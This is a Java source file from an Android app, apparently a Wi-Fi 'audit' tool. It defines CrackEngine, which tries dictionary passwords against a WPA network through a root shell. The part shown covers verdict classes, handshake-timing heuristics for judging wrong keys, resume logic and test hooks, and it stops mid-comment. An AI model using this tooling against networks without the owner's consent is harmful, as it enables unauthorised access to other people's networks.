package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.Prefs;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 唯一的破解引擎。
 *
 * <h3>为什么要收敛成一个引擎</h3>
 * 之前三种模式各有各的实现，各有各的判定，结果就是
 * 「同一个 bug 要在三个地方修，还修不全」—— 事实也证明了这一点：
 * 双重 onFinished、配置复用假阳性，两个 bug 都同时存在于两条通道里。
 *
 * 现在所有通道共用同一套：
 * <ul>
 *   <li>同一套 {@link Verdict} 语义</li>
 *   <li>同一套「多信号综合判定」</li>
 *   <li>同一套重试/超时/取消策略</li>
 * </ul>
 * 通道只负责「把一条候选发出去」，判定完全由引擎做。
 *
 * <h3>多信号综合判定（这是修「跳过正确答案」的关键）</h3>
 * 单一信号都不可靠：
 * <pre>
 *   cmd wifi status 文本   可能被截断、格式随版本变
 *   onAvailable 回调       某些 ROM 会因为别的网络触发
 *   WifiInfo.getSSID()     Android 10+ 受限，更新有延迟
 * </pre>
 * 所以判定同时看**三个信号**，任一确认即成功，全部否才判失败：
 * <ol>
 *   <li>通道回调（requestNetwork 的 onAvailable）</li>
 *   <li>WifiInfo 的当前 SSID</li>
 *   <li>cmd wifi status 文本（有 shell 通道时）</li>
 * </ol>
 *
 * <h3>对外用法</h3>
 * <pre>
 *   CrackEngine engine = new CrackEngine(ctx, Prefs.MODE_ROOT);
 *   engine.run(target, candidates, startOffset, listener);
 * </pre>
 * 通道由调用方用 setShellChannel 接入；现在只有 Root 一种。
 */
public final class CrackEngine {

    private static final String TAG = "WPAForgeEngine";

    // ------------------------------------------------------------------ 结果

    /** 单条候选的结论 */
    public enum Verdict {
        /** 系统确认连上 → 密码正确 */
        SUCCESS,
        /**
         * **候选级**失败：能证明「这条候选的密钥被拒」。
         *
         * <p>语义边界（D1 重新定义，必读）：
         * <ul>
         *   <li>它**不是**「网络上发生过认证失败」——那只是
         *       {@link #NETWORK_AUTH_FAIL}。</li>
         *   <li>它要求证据能把这次失败绑到**当前候选建的配置**上（AT3）。</li>
         * </ul>
         * 当前平台能力下 AT3 尚不可达（见 {@link #NETWORK_AUTH_FAIL} 的说明），
         * 因此这条**短期内不会产生**。保留它是为了让「候选级失败」这个语义
         * 有明确的落点，而不是被含糊地并进网络事件。
         */
        AUTH_FAIL,
        /**
         * **网络级**事件：目标网络确实发生了认证失败，但证明不了它属于当前候选。
         *
         * <h3>为什么必须与 AUTH_FAIL 分开</h3>
         * 三层问题常被混为一谈：
         * <pre>
         *   ① 目标网络发生了认证失败          —— AT1 就能证明
         *   ② **当前 Attempt** 发生了认证失败  —— 需要证据绑定到本次请求
         *   ③ **当前候选密码**导致认证失败     —— 需要绑定到本条候选建的配置
         * </pre>
         * 只有 ③ 成立才算「这个密码错了」。同 SSID 多配置、系统后台重试旧配置、
         * 上一条候选的迟到广播，都能只让 ① 成立却与本条候选无关。
         *
         * <p>把它显示成「密码错误」会直接误导用户：用户会据此认定这条候选已被
         * 排除。所以它是一个**独立的结论**：
         * <ul>
         *   <li>不写 triedSet、不推 cursor（{@code EvidenceGrade.defaultOf} -> NONE）</li>
         *   <li>不计入「已证实失败」，也不计入「推断失败」</li>
         *   <li>不计入退避样本（它不说明候选有问题）</li>
         *   <li>UI 必须用独立文案与视觉，不得显示成「密码错误」</li>
         * </ul>
         */
        NETWORK_AUTH_FAIL,
        /** 超时，没等到结论 → **不判成功** */
        TIMEOUT,
        /**
         * 观察期限结束，但**连接仍处于活动状态**（关联/认证/取 IP 中）。
         *
         * <p>与 {@link #TIMEOUT} 的区别：TIMEOUT = 连接已终止且无结论；
         * INCOMPLETE = 连接**还没结束**，只是我们等不下去了。
         *
         * <p>语义（强制）：**不写 triedSet、不推进 cursor、不永久排除候选**；
         * 它是**可更新快照** —— 后续到达的成功/失败证据可以重新裁决同一 Attempt。
         */
        INCOMPLETE,
        /**
         * 连接**已确认终止**，但原因不明（既没有成功证据，也没有足够的失败证据）。
         *
         * <p>与 {@link #TIMEOUT} 的区别：TIMEOUT = 观察期内没有拿到任何证据；
         * TERMINATED_UNKNOWN = 观察到「连接确实结束了」，但结束原因无法归因。
         *
         * <p>语义（强制）：**不得解释为密码错误**，不写 triedSet、不推 cursor。
         */
        TERMINATED_UNKNOWN,
        /**
         * 目标不在扫描范围 → 这条无意义。
         *
         * <p><b>当前没有生产出口</b>（历史遗留，仅测试引用）。保留是因为枚举是
         * 内部契约、删除会影响既有测试；但**不要假设它会出现** ——
         * 目标消失目前表现为 {@link #TIMEOUT} 或 {@link #UNKNOWN}。
         */
        TARGET_GONE,
        /**
         * 当前确实连着目标，但**无法确认是不是这条候选造成的**。
         *
         * 例如：开跑前就连着、或者上一条的连接还没断开。
         * 这种状态**不能算命中** —— 否则任何密码都会在第一条被误报成功。
         */
        UNKNOWN,
        /** 通道出错 */
        ERROR,
        /** 用户停止 */
        ABORTED
    }

    public static final class Attempt {
        public final String password;
        public final Verdict verdict;
        public final long elapsedMs;
        /** 结论描述。由 {@link #tryOne} 统一追加窗口元数据，故非 final。 */
        public String detail;
        /** 哪一个信号确认的（排查用） */
        public final String confirmedBy;
        /**
         * 本条候选的尝试标识（{@code runId#序号}）。
         *
         * <p>空串 = **没有拿到有效标识**（未接线 / 非法 / 过期），这是一个
         * 显式无效状态，不允许被下游当成「某条合法尝试」。由 {@link #tryOne} 回填。
         */
        public String attemptId = "";
        /**
         * 窗口结束时的**归类码**（机器可读）：{@code not-attempted} /
         * {@code on-target-unattributed} / {@code netid-conflict} /
         * {@code channel-no-response} / {@code status-unclear} / {@code no-evidence}。
         * 循环内提前结案的出口用 {@link #confirmedBy} 表示触发规则，此处留空。
         */
        public String reason = "";
        /**
         * 证据强度等级（2026-11-01 证据模型）。
         *
         * <p>与 {@link #verdict} 正交：verdict 说「结论是什么」，它说「这个结论有多可信」。
         * 构造时按 {@link EvidenceGrade#defaultOf} 取保守默认值，
         * 由 {@link #tryOneShell} 在**已知归属证据**的出口显式标注。
         * 下游只有 {@link EvidenceGrade#persistable} 为真时才允许写入永久记录。
         */
        public EvidenceGrade.Level grade;
        /**
         * 本次结论出自第几轮验证（1 = 主循环；2 = 对 INFERRED 候选的补充验证）。
         *
         * <p>只作记录与追溯，不参与任何判定。
         */
        public int round = 1;
        /**
         * 日志窗口元数据（R6）。{@code null} = 本阶段未采集。
         *
         * <p><b>只作证据质量标注</b>：它不参与任何成功/失败判定。
         * {@code evidenceUsable()} 为真是「允许进一步评估日志证据」的必要条件，
         * 不是充分条件；为假也不等于认证失败。由 {@link #tryOne} 回填。
         */
        public AttemptMarker.Window logWindow;

        Attempt(String password, Verdict v, long ms, String detail, String confirmedBy) {
            this.password = password;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
            this.confirmedBy = confirmedBy == null ? "" : confirmedBy;
            this.grade = EvidenceGrade.defaultOf(v);
        }

        public boolean isSuccess() { return verdict == Verdict.SUCCESS; }
    }

    /**
     * **单条候选结论的提供者**（P0/D5 测试接缝）。
     *
     * <h3>它替换的是什么</h3>
     * 只替换「一条候选跑完得到什么结论」这一步，即 {@link #tryOne} 的返回值。
     * **不碰** cursor 推进、triedSet 记账、候选调度、状态落盘 ——
     * 那些逻辑仍在 {@code run()} 里原样执行。
     *
     * <h3>为什么要这个接缝</h3>
     * 桌面环境无法稳定复现底层无线事件（status 文本、wpa_supplicant 日志、
     * 窗口隔离与时间锚点的组合），因此「真实 run() 消费混合等级」这条调度路径
     * 一直无法验证。有了它，可以用**确定的等级输入**驱动**同一份调度代码**。
     *
     * <h3>边界（明确写死）</h3>
     * <ul>
     *   <li>生产环境为 {@code null} —— 走真实 {@code tryOne}，判定规则一字不改。</li>
     *   <li>实现方**不得**修改 cursor / triedSet / 候选列表（它拿不到这些）。</li>
     *   <li>包级可见，包外与用户界面都无法注入。</li>
     *   <li>它**不能**证明生产判定逻辑正确，只能证明调度器消费等级正确。</li>
     * </ul>
     */
    interface VerdictProvider {
        /**
         * @param password 待测口令
         * @param index    该候选在字典中的位置（1 起）
         * @return 本条候选的结论；返回 {@code null} 视为「未尝试」
         */
        Attempt attemptFor(String password, int index);
    }

    /** 测试注入的结论提供者；{@code null} = 生产路径（真实 tryOne）。 */
    private volatile VerdictProvider verdictProvider;

    /** **仅供测试**：注入结论提供者。传 {@code null} 恢复生产路径。 */
    void setVerdictProviderForTest(VerdictProvider p) {
        this.verdictProvider = p;
    }

    /** 进度回调 */
    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt a);
        void onProgress(int tested, int total, double rate, long etaMs);
        /**
         * 续跑游标（安全边界）回调，每条候选后一次。
         *
         * <p><b>它和 {@link #onProgress} 是两个不同的量，绝不能混用：</b>
         * <ul>
         *   <li>{@code onProgress.tested} = <b>已尝试数</b>（进度显示用；含 INFERRED/NONE，
         *       因为它们确实被尝试过了）。</li>
         *   <li>{@code onCursor.cursor} = <b>安全续跑边界</b>（D5 语义：只由 DIRECT 推进，
         *       有任何未定结论就钉住）。断点续跑必须用它 —— 用 tested 会**跳过
         *       未被排除的候选**（真实事故：正确密码判 INFERRED 后被续跑跳过）。</li>
         * </ul>
         * 默认空实现：仅持久化方（CrackService）需要覆盖。
         */
        default void onCursor(int cursor) { }
        default void onLog(String line) { }
        void onFinished(int tested, int total, String hitPassword, String outcome);
        void onBlocked(String title, String detail);
    }

    // ------------------------------------------------------------------ 成员

    private final Context appCtx;
    private final WifiManager wifi;
    private final int mode;
    /** 连接选项（设置页两个开关），构造时读一次 */
    private final boolean pinBssid;
    private final boolean macRotate;

    /**
     * （已弃用）曾经用作"判为成功的最短耗时"。
     *
     * 移除原因：它误杀了快速连接。
     * 归因已经由「事件必须发生在命令之后」保证，再加时间门槛是多余且有害的。
     * 保留常量只为兼容历史测试，实际判定不再使用。
     */
    @Deprecated
    private static final long MIN_HIT_MS = 0L;


    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /**
     * 时间与等待的提供者（B1，2026-10-31）。
     *
     * <p>默认 {@link EngineClock#PRODUCTION}，即原样转发 {@code SystemClock.uptimeMillis()}
     * 与 {@code Thread.sleep}。**生产路径不做任何"是否被注入"的判断**，
     * 唯一改变行为的方式是包级可见的 {@link #setClockForTest(EngineClock)}，
     * 而它在生产代码（{@code CrackService} / {@code MainActivity} / {@code App}）里没有调用者 ——
     * 编译器会直接挡住同包外的调用，因此不可能污染生产环境。
     */
    private volatile EngineClock clock = EngineClock.PRODUCTION;

    /** 当前时钟。永远非 null（构造即赋值，注入入口拒收 null）。 */
    private EngineClock clock() {
        return clock;
    }

    /**
     * **仅供测试**：注入可控时钟。包级可见，生产代码无法调用。
     *
     * @param c 替身时钟；{@code null} 视为"恢复生产时钟"，
     *          避免测试用完忘记复原导致同进程其它实例被污染。
     */
    void setClockForTest(EngineClock c) {
        this.clock = (c == null) ? EngineClock.PRODUCTION : c;
    }

    /**
     * 连接事件监听器 —— **判定层的唯一真值来源**。
     *
     * 不再轮询 `WifiInfo` / 解析 `cmd wifi status` 文本，
     * 而是让系统在网络可用的**那一刻**主动通知我们。
     */
    private NetworkWatcher watcher;

    /**
     * 认证失败**系统广播**监听器（第三级早退的信号源，2026-10-23 新增）。
     *
     * 与日志判据的区别：它走 framework 广播，**不依赖 logcat**，
     * 因此不受系统日志配额影响（实测日志有时 0 行，是早退失效的主因）。
     */
    private WifiAuthFailureWatcher authWatch;

    /** shell 通道（Root），null 表示没接上 */
    private ShellChannel shell;

    /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
    private int consecutiveTimeouts = 0;

    /** 日志检查用计数器（每 5 轮查一次，避免频繁起进程） */
    private int logCheckCounter = 0;

    // ---- R6：尝试身份（只作记录与追溯，不参与判定）----------------------
    /** 本次任务的 runId；null = 尚未生成或生成失败。 */
    private volatile String currentRunId;
    /** 同进程内第几次任务（保证同秒启动也不重号）。 */
    private int runOrdinal = 0;

    /**
     * 运行序号基线（D2）：本次进程内第一个 runId 使用的 ordinal。
     *
     * <h3>它修的退化</h3>
     * runId 的唯一性靠三层：bootId（跨开机）· 毫秒时间戳（跨进程）· runOrdinal（跨调用）。
     * 当 {@code /proc/sys/kernel/random/boot_id} **读不到**（无 root / 通道异常）且
     * 两次进程恰好落在**同一毫秒**、同一 SSID、且 ordinal 都从 0 起时，
     * 三层全失效 —— 旧 Attempt 的 attemptId 会与新 Attempt 逐字节相同，
     * 日志窗口标记互相匹配，别人的证据被算到本条头上（D2 的「旧事件污染新 Attempt」）。
     *
     * <p>修复：ordinal 不再固定从 0 起，而是从**落盘的基线**（上次用到哪）之后继续。
     * 这是「跨进程单调计数」，不依赖 bootId，也不依赖时钟精度。
     *
     * <p>默认 {@code 0}（无持久化时行为与旧版逐字节一致）。
     */
    private int runOrdinalBase = 0;

    /**
     * 设置本次进程的运行序号基线（D2）。
     *
     * @param base 上次进程落到磁盘的最大 ordinal；&lt; 0 视为 0
     */
    public void setRunOrdinalBase(int base) {
        this.runOrdinalBase = Math.max(0, base);
        this.runOrdinal = this.runOrdinalBase;
    }

    /** 当前生效的运行序号基线（用于跨进程续接；每次 run 结束可回写）。 */
    public int runOrdinalBase() { return runOrdinalBase; }

    /**
     * 当前已用到的 ordinal（-1 表示还没跑过任何 run）。
     *
     * <p>调用方在 run 结束后把它 +1 落盘，下次启动 {@link #setRunOrdinalBase} 回灌。
     */
    public int runOrdinalNow() { return runOrdinal; }
    /**
     * 外部预设的 runId（R7 续跑用）。
     *
     * <p>续跑时由服务层用 {@code AttemptId.adoptForResume} 生成新 runId 并预置进来，
     * 好处是**血缘**（previousRunId）只在服务层记录一次，引擎仍是单一事实来源。
     * 绝不允许用它复用旧 runId —— 由 {@code adoptForResume} 保证新 id 不同。
     */
    private volatile String presetRunId;
    /** 取本次运行的标识（null = 还没开始跑）。 */
    public String currentRunId() { return currentRunId; }
    /** 预置本次运行的标识；传 null 清除（下次 run() 自行生成）。 */
    public void presetRunId(String runId) {
        this.presetRunId = AttemptId.wellFormedRunId(runId) ? runId : null;
    }
    /** 最近一次尝试的日志窗口元数据（由 tryOne 回填到 Attempt）。 */
    private volatile AttemptMarker.Window lastWindow;
    private static final int TIMEOUT_ALERT = 5;

    /**
     * 自适应窗口（P0 提速）：连续 {@link #TRIM_AFTER_NO_EVIDENCE} 条「观察窗口
     * 结束、无证据」超时后，单发时限从 {@code 10s} 缩到本值。
     * 只针对「目标网络不给任何证据」的场景（典型：手机热点），判定结果不变。
     */
    private static final long WINDOW_TRIMMED_MS = 6_000L;
    /** 连续多少条无证据超时后触发缩窗。 */
    private static final int TRIM_AFTER_NO_EVIDENCE = 4;


    public CrackEngine(Context ctx, int mode) {
        this.appCtx = ctx.getApplicationContext();
        this.watcher = new NetworkWatcher(appCtx);
        this.authWatch = new WifiAuthFailureWatcher(appCtx);
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.mode = mode;
        this.pinBssid = Prefs.pinBssid(appCtx);
        this.macRotate = Prefs.macRotate(appCtx);
    }

    /**
     * **仅供测试**：不碰 Android 运行时的构造入口（包级可见）。
     *
     * <h3>它不是"另一套初始化逻辑"</h3>
     * 生产构造里需要初始化的 final 字段一共 6 个（{@code appCtx / wifi / mode /
     * pinBssid / macRotate} + 两个 AtomicBoolean 在声明处初始化）。
     * 本构造**逐一赋同样的类型、同样的语义位**，区别仅在于：
     * 凡是"必须由 Android 系统提供"的，一律给 null/false，
     * 且这些值在引擎里**都已有 null/false 的合法处理分支**（见每条注释）。
     * 其余所有字段（{@code clock}、{@code shell}、{@code cancelFlag}、
     * 各类计时器）都在**字段声明处**初始化，两条路径共用同一份声明，
     * 没有任何一个字段被"另一套代码"初始化过。
     *
     * <h3>逐字段依据</h3>
     * <ul>
     *   <li>{@code appCtx = null}：引擎里 appCtx 仅出现在
     *       {@code snapshotSsid()} 的 AppOps 权限检查分支（:514-525）。
     *       该分支只在 {@code shell == null} 时才可能走到，且整段包在
     *       {@code catch (Throwable)} 里；测试必设 shell，故不可达。</li>
     *   <li>{@code wifi = null}：{@code snapshotSsid()}/{@code currentNetId()}
     *       都是「有 shell 就优先走 shell，wifi 只是兜底」，且兜底前有
     *       {@code if (wifi == null) return null / return -1}。</li>
     *   <li>{@code watcher = null}：只用于诊断输出（:2038-2048）与
     *       {@code run()} 的 start/stop（:1762/2097），均先判 null。
     *       **不参与判定**（审计 §二 实证）。</li>
     *   <li>{@code authWatch = null}：判定段 :1502 有
     *       {@code if (authWatch != null && authWatch.isRegistered())} 前置，
     *       null 等价于「本机收不到认证失败广播」——这是生产里同样存在的合法状态
     *       （{@code registerReceiver} 失败时 {@code registered=false}）。</li>
     *   <li>{@code pinBssid / macRotate = false}：与 SharedPreferences
     *       缺省值一致（{@code Prefs} 里 {@code getBoolean(K, false)}）。</li>
     * </ul>
     *
     * @param mode 执行模式，语义与生产构造一致
     */
    CrackEngine(int mode) {
        this.appCtx = null;
        this.watcher = null;
        this.authWatch = null;
        this.wifi = null;
        this.mode = mode;
        this.pinBssid = false;
        this.macRotate = false;
    }

    /**
     * 本次启动的唯一标识（跨重启区分 attemptId）。
     *
     * <p>来源 {@code /proc/sys/kernel/random/boot_id}：内核在每次启动时生成，
     * 本机实测形如 {@code d159099b-29b5-45f5-8c8f-da602993a032}。
     *
     * <p>读不到（无 root / 通道异常 / 非 Linux）时返回 {@code null} ——
     * 此时 runId 退回旧算法（不含启动标识）。**这是有意的降级**：
     * 不能因为拿不到 bootId 就不发判定，那会把整条判定链堵死；
     * 代价仅仅是「跨重启可能重号」这个已知残余风险继续存在。
     *
     * <p>为什么缓存：一次判定跑几百条候选，每条都去 cat 一次文件没有意义。
     */
    private volatile String bootIdCache = null;
    private volatile boolean bootIdTried = false;

    String bootId() {
        if (bootIdTried) return bootIdCache;
        bootIdTried = true;
        try {
            String s = shell == null ? null
                    : shell.exec("cat /proc/sys/kernel/random/boot_id 2>/dev/null", 3000);
            if (s != null) {
                s = s.trim();
                // 形状校验：非空、无空白、长度合理 —— 不做格式假设（不同内核可能不同）
                if (!s.isEmpty() && s.length() <= 64 && s.indexOf(' ') < 0
                        && s.indexOf('\n') < 0) {
                    bootIdCache = s;
                }
            }
        } catch (Throwable ignored) { }
        return bootIdCache;
    }

    /**
     * **仅供测试**：给测试构造的引擎装一个认证失败监听器。
     *
     * <p>为什么不直接改 {@code CrackEngine(int)}：那条路径刻意把所有
     * Android 系统对象置 null（见其注释）。authcast 分支的前置正是
     * {@code authWatch != null && authWatch.isRegistered()}，
     * 所以只能在测试里显式装一个**同样走生产判定代码**的实例。
     *
     * <p>生产路径不变：生产构造里 authWatch 由真实 Context 创建。
     */
    void setAuthWatchForTest(WifiAuthFailureWatcher w) {
        this.authWatch = w;
    }

    // ------------------------------------------------------------------ 通道

    /** shell 通道抽象 */
    public interface ShellChannel {
        String exec(String cmd, long timeoutMs);
        /**
         * @deprecated F4：唯一调用者 {@code verifyHit()} 已删除。
         *
         * <p>这里刻意留下一个**空默认实现**，而不是继续保留原来的「删净目标配置」
         * 实现 —— 收尾恢复现在由 {@code RestoreRunner} 统一负责，
         * 若还有人把删除逻辑接回来，两处各删一次会把刚恢复好的配置再删掉。
         * 需要删配置请走 {@code ConfigRestorer.removeTarget}。
         */
        @Deprecated
        default void forgetTarget(String ssid) {}
        String name();
        /** 收尾钩子：常驻会话（su -c sh）必须在这里关掉，别把 root shell 留在后台。 */
        default void close() {}
    }

    public void setShellChannel(ShellChannel ch) {
        this.shell = ch;
    }

    /**
     * 供「连接自测」用：对指定 SSID+密码跑一次完整判定。
     *
     * 与正式破解走同一条路径（tryOne），只是 SSID 和密码由界面直接给出。
     */
    /**
     * 第二级早退的静默窗口（毫秒）。
     *
     * <p>真机实测（2026-10-23，B214）：正确密码从「命令发出」到「四条件成立（拿到 IP）」
     * 只要 670~722 ms；M2 是在 M1 之后约 4ms 发出的，AP 的 M3/M4 紧随其后。
     * 而错误密码时，AP 要等到 **1.0 秒后**才重发 M1。
     *
     * <p><b>阈值 600 → 1200（2026-10-24 实机事故）</b>：正确密码的「四条件成立」
     * 要等 DHCP 拿地址，实测一次命中共用 1368ms —— M1 之后到四条件成立只差
     * 几十毫秒就可能被 600ms 的静默判据抢先判成「密码错」，于是**对着正确的
     * 密码跳过去**（用户报的正是这个）。1200ms 留足余量：真密码错时，
     * M1 重发判据（M1+0.96s）通常先命中，代价只是「日志配额把重发行丢掉的
     * 少数情况」多等约 0.6 秒。
     *
     * <p>代价说明：本判据在极端拥塞的 AP 上可能把**正确**密码误判为失败（只会漏判，
     * 绝不会误判成功）——与本项目「宁可漏判，不可误判」的一贯取舍一致。
     */
    public static final long EARLY_FAIL_SILENCE_MS = 1200L;

    /**
     * M1 重发判据的**复核窗口**（D4）。
     *
     * <h3>为什么从 120ms 提到 1000ms</h3>
     * 原实现：「看到第 2 次 M1」后仅等 120ms 就结案判密码错。
     * 但本机实测（代码既有注释）：**正确密码从命令到四条件成立需要 670~950ms**，
     * 慢 AP 甚至 5~9 秒。120ms 内成功证据根本来不及到达 ——
     * 一条实际正确的候选会被 m1retry 判死。
     *
     * <p>取值 1000ms：覆盖实测上限（950ms）。代价是错误密码每条多等约 0.9 秒，
     * 换来的是「正确密码不再被这条推断判死」。
     *
     * <p>注意：这只影响**判定时机**，不改变判定条件本身
     * （{@code m1RetryImpliesWrongKey} 仍是「M1≥2 且无成功证据」）。
     */
    public static final long M1_RETRY_CONFIRM_MS = 1000L;

    /**
     * wpalog **支B**（无归属握手失败/关联被拒）的确认窗口（毫秒）。
     *
     * <h3>为什么支B 需要它，支A 不需要</h3>
     * 支A（{@code sawWrongKeyForAttempt}）拿到的是 wpa_supplicant 对**这一次**
     * 的直接否认（带 SSID 归属）→ 可靠，可立即结案。
     * 支B 的 {@code 4-Way Handshake failed} / {@code CTRL-EVENT-ASSOC-REJECT}
     * **零字段 / 仅 bssid**，无法证明属于本条候选（很可能是上一条的延迟残留）。
     * 若立即 return，会**在上一条残留到达的那一刻**把本条正确密码判死 ——
     * 真机事故（2026-11-02）：正确候选被判 {@code AUTH_FAIL/INFERRED/wpalog}。
     *
     * <h3>做法</h3>
     * 支B 首次命中只「武装」计时器，**不结案**；窗口内继续轮询，
     * 成功判据（在本次判定之前）仍有每轮的机会命中 → 后到的成功证据能参与裁决。
     * 窗口到期仍无成功证据，才按 INFERRED 结案。
     *
     * <p><b>窗口时长的取值说明</b>：此处复用 {@link #M1_RETRY_CONFIRM_MS}
     * （与 m1retry 的确认窗口同源，避免新增随意常量）。**该值需按真机测量调整** ——
     * 慢速 AP 的成功证据可能晚于 1 秒到达；调整前不得宣称「已彻底解决」。
     */
    private static final long WPLOG_INFERRED_CONFIRM_MS = M1_RETRY_CONFIRM_MS;

    /**
     * 第二级早退判据（纯函数，便于离线单测）。
     *
     * @param m1Seen       本次尝试已见到 M1（RX message 1 of 4-Way Handshake）
     * @param negotiated   已见到属于目标的握手完成（Key negotiation completed）
     * @param msSinceM1    距首次看到 M1 的毫秒数
     * @param silenceMs    静默窗口阈值
     */
    public static boolean m1SilentImpliesWrongKey(boolean m1Seen, boolean negotiated,
                                                  long msSinceM1, long silenceMs) {
        return m1Seen && !negotiated && msSinceM1 >= silenceMs;
    }

    /**
     * 早退判据的**纯函数**形式（便于离线单测）。
     *
     * <p>规则：本次尝试里 M1 被重发（收到 ≥2 次 "RX message 1 of 4-Way Handshake"）
     * 且没有出现属于目标的握手完成证据 → 密码必然错误。
     *
     * <p>真机依据（2026-10-23，ColorOS 15）：M1#2 稳定出现在 M1#1 + 0.96 秒；
     * 正确密码不会产生重发的 M1（M1#1 后 ~200ms 内即走 M3/M4）。
     *
     * @param m1Count     本次尝试里收到 M1 的次数
     * @param successSeen 是否已看到**属于目标 BSSID** 的握手完成（Key negotiation completed）
     */
    /**
     * 每条候选的耗时分解串（定位「时快时慢」用）。
     * 形如 {@code  [关联 5200ms / M1 5400ms / 广播 -] }
     */
    static String timing(long tAssocMs, long tM1Ms, long tAuthMs) {
        return "  [关联 " + (tAssocMs < 0 ? "-" : tAssocMs + "ms")
                + " / M1 " + (tM1Ms < 0 ? "-" : tM1Ms + "ms")
                + " / 广播 " + (tAuthMs < 0 ? "-" : tAuthMs + "ms") + "]";
    }

    /**
     * 一条候选的判词短标签，用于收尾那条「最近判定」尾巴（纯函数，可测）。
     *
     * <p>形如 {@code sample-pw=✗m1silent} / {@code password=✓wpalog} / {@code x=超时}。
     * 为什么要这个：2026-10-24 用户报「明明正确的密码被跳过去」，而**文件日志里
     * 一条判词都没有**（逐条结果只走界面回调），查不动。现在每次跑完没命中，
     * 最后 6 条的判词会写进文件日志，这种事自己就能说清。
     */
    /**
     * 候选是否是**可尝试**的口令（WPA-PSK 要求 8..63 个字符）。纯函数，可离线测。
     *
     * <p>字典装载侧已有三处同规则过滤（{@code DictStore:336} / {@code DictStore:399} /
     * {@code DictGenerator:57}），这里是判定链入口的**防御性校验**：任何绕过上游过滤的
     * 候选都必须落到「未尝试」，而不是「密码错误」。
     */
    public static boolean isValidLength(String password) {
        return password != null && password.length() >= 8 && password.length() <= 63;
    }

    /**
     * 带尝试标识的判词（R6）：让每条判词都能追到具体尝试。
     *
     * <p>标识缺失或非法时输出 {@code <id-invalid>} —— **显式无效**，
     * 不允许悄悄省略、也不允许退化成某个合法 id。
     */
    public static String verdictTag(String attemptId, int index, String password,
                                    Verdict v, String by) {
        String id = AttemptId.wellFormed(attemptId) ? attemptId : "<id-invalid>";
        return "[" + id + "] " + verdictTag(index, password, v, by);
    }

    public static String verdictTag(int index, String password, Verdict v, String by) {
        // 口令一律脱敏（#哈希前6(len=N)），顺序号保留 —— 顺序号是非敏感信息，
        // 却是排查时对回字典的关键（"第 11 条是哪个口令"）。
        String pw = io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(index, password);
        if (v == null) return pw + "=?";
        switch (v) {
            case SUCCESS: return pw + "=✓" + (by == null || by.isEmpty() ? "hit" : by);
            case AUTH_FAIL: return pw + "=✗" + (by == null || by.isEmpty() ? "auth" : by);
            // D1：网络级认证失败有**独立**符号 —— 不能与候选级 ✗ 混用。
            case NETWORK_AUTH_FAIL: return pw + "=网✗"
                    + (by == null || by.isEmpty() ? "" : by);
            case TIMEOUT: return pw + "=超时";
            // B5：B2 新增的两个 verdict 此前落到 default，一律显示「?不明」——
            // 「连接还在跑、可以重新裁决」与「连接已终止但无归因」在界面上
            // 和真正的未知混成一个符号，用户看不出该不该重试。三种必须分开。
            case INCOMPLETE: return pw + "=…续";        // 未收敛，可重新裁决
            // P1b：原为 "=…终" —— 「终」被用户读成「连接断了 / 密码错了」。
            // 实际是「本次没连上，但没有证据证明密码对错」。同时**必须带出来源**
            // （failover / m1retry / wpalog），否则几十条相同的「未证实」在日志里
            // 无法区分是哪一层判的，也就不可能排查。
            case TERMINATED_UNKNOWN: return pw + "=未证实"
                    + (by == null || by.isEmpty() ? "" : by);
            case UNKNOWN: return pw + "=?未定";          // 归属/状态不明确
            case TARGET_GONE: return pw + "=目标不在";
            // 归因码优先：ERROR 类里既有"通道出错"，也有"候选不合法/未尝试"，
            // 只写"通道"会把后者说错。by 为空时保持原样（兼容既有断言）。
            case ERROR: return pw + "=!" + (by == null || by.isEmpty() ? "通道" : by);
            case ABORTED: return pw + "=⏹中断";
            default: return pw + "=?不明";
        }
    }

    public static boolean m1RetryImpliesWrongKey(int m1Count, boolean successSeen) {
        return !successSeen && m1Count >= 2;
    }

    public Attempt tryOneForTest(String ssid, String password, long timeoutMs) {
        io.github.wlmosv_png.wpaforge.core.NetRecord t =
                new io.github.wlmosv_png.wpaforge.core.NetRecord(
                        ssid, "", 0, 2437,
                        io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2,
                        false, "");
        return tryOne(t, "wpa2", password, timeoutMs);
    }

    /** 供界面做环境诊断时取当前通道（可能为 null）。 */
    public ShellChannel getShellChannelForDiag() {
        return shell;
    }

    // -------------------------------------------------- 观察窗口结束后的归类（纯函数）

    /** 看门狗到期时的归类结果：业务结论 + 机器可读的理由码。 */
    public static final class DeadlineOutcome {
        public final Verdict verdict;
        /**
         * 理由码：{@code not-attempted} / {@code on-target-unattributed} /
         * {@code netid-conflict} / {@code channel-no-response} /
         * {@code status-unclear} / {@code no-evidence}。
         */
        public final String reason;

        DeadlineOutcome(Verdict v, String r) { this.verdict = v; this.reason = r; }
    }

    /**
     * 观察窗口（看门狗）结束时的归类 —— **纯逻辑，可离线逐格穷举**。
     *
     * <h3>R3 的关键修正：到期 ≠ 密码错</h3>
     * 旧实现在「等满时限、什么都没观察到」时也返回 {@code AUTH_FAIL}，
     * 等于把「没有成功证据」当成「失败已被证明」。那条路径在整个引擎里
     * 是**唯一**会产出「无证据失败结论」的地方，故单独抽成纯函数钉死。
     *
     * <p>现在它返回 {@link Verdict#TIMEOUT}（观察窗口结束、没有明确结论），
     * 与「有可归因失败证据的 {@code AUTH_FAIL}」严格区分；
     * 该值早已在枚举、判词标签与消费方（{@code BackoffPolicy} 明确把它排除在
     * 「AP 的响应样本」之外）中存在，本次只是**给它接上真实生产路径**。
     *
